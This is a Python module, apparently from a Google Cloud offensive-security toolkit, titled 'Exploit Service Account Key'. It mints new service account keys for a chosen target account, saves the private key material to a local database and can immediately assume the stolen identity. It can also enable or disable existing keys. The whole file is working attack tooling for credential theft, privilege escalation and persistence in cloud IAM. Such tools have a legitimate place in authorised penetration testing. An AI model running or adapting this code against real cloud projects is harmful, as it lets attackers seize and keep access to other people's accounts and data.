import argparse, os, ast, time
from Modules.IAM.utils.util_helpers import *

def save_service_account_key(service_account,session):
    table_name = 'iam-sa-keys'

    save_data = {}
    
    if service_account.name: save_data["name"] = service_account.name
    if service_account.private_key_type: save_data["private_key_type"] = service_account.private_key_type
    if service_account.key_algorithm: save_data["key_algorithm"] = service_account.key_algorithm
    if service_account.private_key_data: save_data["private_key_data"] = service_account.private_key_data
    if service_account.public_key_data: save_data["public_key_data"] = service_account.public_key_data
    if service_account.valid_after_time: save_data["valid_after_time"] = service_account.valid_after_time
    if service_account.valid_before_time: save_data["valid_before_time"] = service_account.valid_before_time
    if service_account.key_origin: save_data["key_origin"] = service_account.key_origin
    if service_account.key_type: save_data["key_type"] = service_account.key_type
    if service_account.disabled: save_data["disabled"] = service_account.disabled

    session.insert_data(table_name, save_data)

# Entrypoint
def run_module(user_args, session, first_run = False, last_run = False, callback = False, output_format = ["table"]):
    
    # Set up static variables
    workspace_id = session.workspace_id

    # Set up Argparser to handle flag arguments
    parser = argparse.ArgumentParser(description="Exploit Service Account Key", allow_abbrev=False)
    
    # Module specific arguments
    parser.add_argument("--sa", type=str, required=False,  help="Service account to generate service key for in the format projects/[project_id]/serviceAccounts/[email]")
    parser.add_argument("--sa-key", type=str, required=False,  help="Service account to key to enable/disable")

    exclusive_group = parser.add_mutually_exclusive_group(required=False)
    exclusive_group.add_argument('--create', action="store_true", help='Create SA key')
    exclusive_group.add_argument('--disable', action="store_true", help='Disable SA key')
    exclusive_group.add_argument('--enable', action="store_true", help='Enable SA key')

    parser.add_argument('--assume', action="store_true", help='Assume the new credentials once created')

    # Debug/non-module specific
    parser.add_argument("-v","--debug",action="store_true",required=False,help="Get verbose data during the module run")

    args = parser.parse_args(user_args)

    action_dict = {}
    debug = args.debug
    
    iam_client = iam_admin_v1.IAMClient(credentials = session.credentials)
    
    full_sa_name = None

    if not (args.create or args.disable or args.enable):
        choice = session.choice_selector(["CREATE", "ENABLE", "DISABLE"],"Do you want to create a new sa key or disable/enable an existing one?")

        if not choice:
            print("Exiting...")
            return -1 

    # Choose SA email regardless of choice
    if args.sa:

        full_sa_name = args.sa

    else:

        if not full_sa_name:
            full_sa_name = session.choose_member(type_of_member = "service_accounts", full_name = True)
            if not full_sa_name:
                print("Exiting...")
                return -1
    
    project_id = full_sa_name.split("/")[1]

    if args.create or choice == "CREATE":

            # https://googleapis.dev/python/iamcredentials/latest/iam_credentials_v1/types.html#google.cloud.iam_credentials_v1.types.GenerateAccessTokenResponse
            account_key = iam_generate_service_account_key(iam_client, full_sa_name, debug=debug)
            
            if account_key:
                
                action_dict.setdefault(project_id, {}).setdefault("iam.serviceAccountKeys.create", {}).setdefault("service account", set()).add(full_sa_name)
                session.insert_actions(action_dict, project_id, column_name = "service_account_actions_allowed")
                
                save_service_account_key(account_key, session)

                if not args.assume:
                    answer = session.choice_prompt(f"The key was successfully created. Do you want to try assuming the new credentials [y\\n].")

                if args.assume or answer.lower() == "y": 
                    timestamp = time.time()
                    sa_email = full_sa_name.split("/")[-1]
                    credname = sa_email + f"_{timestamp}"

                    private_key_info = account_key.private_key_data.decode('utf-8')
                    session.add_service_account("", credname, email = sa_email, sa_info = private_key_info, assume = True)
            
            else:
                print(f"[X] Unable to generate an access token for {full_sa_name}. Exiting...")
                return -1
                
    elif (args.enable or choice == "ENABLE") or (args.disable or choice == "DISABLE"):
        
        if args.sa_key:

            sa_key = args.sa_key

        else:

            rows_returned = session.get_data("iam-sa-keys", columns = ["name", "valid_before_time", "disabled"], conditions = f"name LIKE \"%{full_sa_name}%\"" )
            
            if len(rows_returned) == 0:
                print("[X] No service account keys were identified in the existing databases. If you know of the email re-run the module with the --sa-email flag. Exiting...")
                return -1
            else:
                original_names = []
                for item in rows_returned:
                    item['display_name'] = item['name'].split('/keys/')[-1]
                    if item['disabled'] == "True":
                        item['display_name'] =  "[DISABLED] " + item['display_name']
                    else:
                        item['display_name'] =  "[ACTIVE] " + item['display_name'] 
                    if item["valid_before_time"] == "9999-12-31 23:59:59+00:00":
                        item['valid_before_time'] = "NEVER EXPIRES"
                    else:
                        item['valid_before_time'] = "VALID BEFORE: " + item['valid_before_time'] 

                sa_dict = session.choice_selector(rows_returned,"Choose an existing sa key from those to enable:", fields=["display_name", "valid_before_time"])
                sa_key = sa_dict["name"]
            
            if (args.enable or choice == "ENABLE"):
                status = iam_enable_service_account_key(iam_client, sa_key, debug=debug)

                if status:
                    action_dict.setdefault(project_id, {}).setdefault("iam.serviceAccountKeys.enable", {}).setdefault("service account", set()).add(full_sa_name)


            elif (args.disable or choice == "DISABLE"):

                status = iam_disable_service_account_key(iam_client, sa_key, debug=debug)
                if status:
                    action_dict.setdefault(project_id, {}).setdefault("iam.serviceAccountKeys.disable", {}).setdefault("service account", set()).add(full_sa_name)




